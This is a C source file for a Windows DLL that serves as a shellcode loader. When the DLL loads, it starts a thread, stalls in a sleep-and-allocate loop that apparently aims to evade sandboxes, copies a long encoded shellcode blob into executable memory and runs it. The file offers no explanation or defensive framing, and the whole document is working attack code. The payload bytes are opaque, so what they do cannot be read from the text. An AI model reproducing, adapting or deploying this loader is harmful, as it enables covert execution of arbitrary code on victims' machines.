#include <Windows.h>
#pragma comment(linker, "/Entry:DllMain")


char shellcode[] =
"\xbd\x2f\x96\x95\x8c\xd9\xe9\xd9\x74\x24\xf4\x58\x33\xc9\xb1"
"\xd6\x83\xc0\x04\x31\x68\x10\x03\x68\x10\xcd\x63\x2d\x1b\x5a"
"\x02\xe8\xff\x91\xc3\x81\xdb\xdd\xaf\x40\xed\xac\x9f\xa2\xae"
"\xdb\x1c\x86\x25\x60\xe1\x0c\xa4\x04\x17\x38\x76\x10\x90\xd1"
"\xf1\x99\x2c\xd4\x81\x38\xc7\x57\xb4\x62\x3f\x38\x7b\x4b\x87"
"\xb5\x40\xe4\x6b\xfe\x30\xcd\xcb\xcf\xc3\x0f\xc2\xe3\xf1\x5a"
"\xd8\x7d\x3a\xcd\x62\x1c\x11\x01\xc2\x82\x9e\xc0\x45\xde\x9e"
"\x16\xdc\xbe\xcc\xbb\xf4\x87\x34\x3d\xc0\x8d\xcd\xea\xbf\x30"
"\x40\xf9\x38\x62\x28\x55\x73\x6f\x16\x2a\xd4\x2b\x9a\x72\x51"
"\x2c\xe6\x88\xda\x49\x2f\xe0\x37\x93\xcd\x8a\xed\xab\xde\x3d"
"\x4a\x21\x0f\x59\x25\x5a\x26\x16\xfc\xff\xb5\x6f\x8b\x2d\xf0"
"\x12\x1b\xcb\x4d\x6d\xd2\xa2\xda\x8e\x10\x72\xa2\xf9\x13\x0e"
"\x22\x53\xfe\x9c\xb2\x69\x64\x0b\xaf\x87\x02\x75\x0d\x5d\x82"
"\x93\x3b\x74\x7f\xc9\x09\xf0\xa9\x75\x06\xf8\x5b\xc4\xe3\x16"
"\xcb\xe3\xfe\x0e\x87\x61\xd8\x67\xc8\x33\x29\xf3\x60\x7a\x71"
"\x17\xb8\x02\x8e\x7b\xf2\xd4\x74\x05\x51\x95\xd2\x4e\x22\x98"
"\xe0\x4c\x44\x06\x6b\x42\x5d\x52\x62\x04\x16\x6a\x49\x08\xb3"
"\xba\xea\xfb\x29\x37\x7c\x42\x74\x29\x06\x4d\xf7\xa3\x16\x45"
"\x08\x24\xb9\xaa\x66\xe8\x7a\xcf\x64\x1b\xca\xb8\xff\x69\xd3"
"\xb8\x86\x36\xdc\x60\x67\x54\xcd\x5c\x3f\x2e\x5a\x6a\xdd\x6a"
"\xac\x4f\xb6\xd3\x0f\x39\x43\xb8\xf8\xb6\xcc\xa0\xa1\x41\xb9"
"\xea\x81\x40\x60\x10\x46\x38\xe9\x29\x27\xec\xe2\x4b\xf6\x03"
"\x60\x31\xc3\x73\x09\x79\x1e\x6c\x0b\x09\x92\x84\xeb\x22\x85"
"\x29\x6b\xcc\x9d\xdb\x3d\x4e\xcb\x36\x03\xe2\x85\xbc\xa4\x7d"
"\x27\x85\xa4\xcd\x91\x1d\x92\xf2\x60\xac\x24\x31\x29\x3d\x81"
"\x6b\xbe\x18\x68\x85\xb2\xb5\xb1\xe7\x17\xcc\x08\x14\xbb\xb2"
"\x87\x0c\x33\x62\x31\xc0\xbd\xe7\xd9\xaf\x27\xe0\x49\x4c\x23"
"\x89\x3a\x17\x40\x6f\x3b\xf9\xb7\x1f\x74\x6f\x0b\xf1\x39\xc2"
"\x52\xec\x90\x21\xce\x09\xf8\x7d\x2e\xeb\x93\xae\xd1\xcb\x00"
"\x23\x6b\x1f\x06\x17\xf6\xb4\xa9\x35\xc0\x4a\x21\x45\x0c\x18"
"\xbb\xa6\xf6\x60\x10\xef\x7d\x93\x60\x87\xdc\x30\x20\x37\x93"
"\xe1\x22\x32\x16\x00\xaa\x59\x01\x5f\xf0\x8c\xfe\xef\xe7\x22"
"\xb7\x42\xbd\xa0\xba\xe7\x5e\xe7\x0c\x56\xc3\xb9\xff\x63\x7c"
"\x5a\x78\x7f\x2a\x20\x7e\x90\x2e\x09\xa8\x53\xf6\x3c\xb1\xc2"
"\x5b\x4b\x95\x9b\xfc\x4d\xf5\x36\x05\x80\x00\x0b\x87\x09\xa4"
"\x8a\x01\x46\xf6\x90\xb8\xfa\x89\xa9\x67\x0b\xa6\xe2\x9c\xc9"
"\xa1\x63\x1f\x4e\xad\x65\xfe\x1e\x5b\xe7\xfa\x30\xe8\xe9\xb7"
"\xa0\x46\x0b\xd2\x58\x57\x4f\xab\xc4\x73\x95\x15\xeb\xae\xd7"
"\x69\x10\x41\xbe\x45\xac\x18\x2c\xa2\xd2\xde\x4c\x09\xc4\x39"
"\x38\xff\x27\xb9\xc7\xbb\x13\xc7\x2b\xc9\xc5\xee\x9b\x56\x93"
"\x82\x12\xf0\xd9\x8a\xe7\x9e\x17\xff\x15\x1f\x46\x76\x71\x20"
"\xfb\x2c\x7e\xd1\x79\xa2\x9e\x33\xbc\x0f\x07\x39\x73\x3b\x74"
"\x47\xe1\x10\xa3\x68\x76\xed\xc5\x01\xd9\xa9\x05\xcf\xd2\x4f"
"\x0b\x9f\x87\x4d\xb0\x78\x8a\x84\x04\xa2\x81\x40\xdd\xeb\xc0"
"\x1c\x75\xf3\x53\x45\x2e\xf0\x1b\x1f\x01\x6f\xfd\x1d\xf1\x59"
"\x3b\x8a\x27\x63\xec\x23\xec\x9f\x19\xaf\x70\xc0\xc4\x14\xa7"
"\x44\x1a\xb2\xef\x97\x31\x02\x33\x3e\x5c\xc2\x75\x4d\x40\xf2"
"\x43\x15\x4e\xba\x07\xb0\xad\x42\x18\x35\x15\x49\xe4\x06\x11"
"\xa6\xf5\x21\x47\x97\x88\x77\xa9\xc7\x34\xad\x2e\x77\x7f\x4b"
"\xea\xd6\x10\x2d\x0f\xfc\x91\x70\x64\xb8\x4e\xd3\x4c\x6a\xef"
"\xd3\xba\x05\x67\x5a\xaf\x3e\x6d\xbe\xa6\x61\xd8\x09\xbe\x61"
"\xb2\x26\x85\x20\x53\x48\x52\x2e\x7e\x92\x1c\x1e\x25\xbc\x85"
"\x9a\xf2\xa5\xfc\xbf\x39\x93\x45\x5c\x09\x7d\x58\x5b\x5b\x01"
"\x9d\xf6\x27\xca\x69\x91\xd9\x4c\x63\xd0\x17\x8c\x17\xad\x8b"
"\xd8\xf9\x7e\xc7\xff\xd6\x3a\xbd\xfb\x74\xc0\x2f\x68\x33\x01"
"\x77\xa9\x41\x23\x40\x25\x20\xb5\x59\xee\xde\xef\x82\x03\xc9"
"\xae\x8c\x3d\x56\x0b\x1f\xee\xdf\x70\x6d\x21\xc7\xde\xcc\x5e"
"\x50\x21\x33\x35\xec\x48\xe3\x24\x69\x94\xc8\xde\x82\xc1\xb1"
"\x2d\xd2\xc5\x7e\xb0\x5c\x10\x35\x57\x57\xab";


DWORD WINAPI ClientThread(LPVOID param)
{
    for (int i = 0; i < 32; i++) {
        Sleep(1000);
        void* pMalloc = malloc(32000);
        free(pMalloc);
    }

    HANDLE hProcess = GetCurrentProcess();
    void* pShellcode = VirtualAllocEx(hProcess, NULL, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(pShellcode, shellcode, sizeof(shellcode)-1);

    int(*func)();
    func = (int(*)()) pShellcode;
    (*func)();

    //MSG Msg;
    //while (GetMessage(&Msg, NULL, 0, 0) > 0)
    //{
    //    TranslateMessage(&Msg);
    //    DispatchMessageA(&Msg);
    //}
    
    MessageBoxA(NULL, "aaa", "bbb", 0);
    return 0;
}


BOOL APIENTRY DllMain(HMODULE, DWORD reasonToCall, LPVOID)
{
    if (reasonToCall == DLL_PROCESS_ATTACH)
    {
        HANDLE hThread = CreateThread(NULL, 0, ClientThread, NULL, 0, 0);
        if (hThread != NULL)
        {
            CloseHandle(hThread);
        }
    }
    return TRUE;
}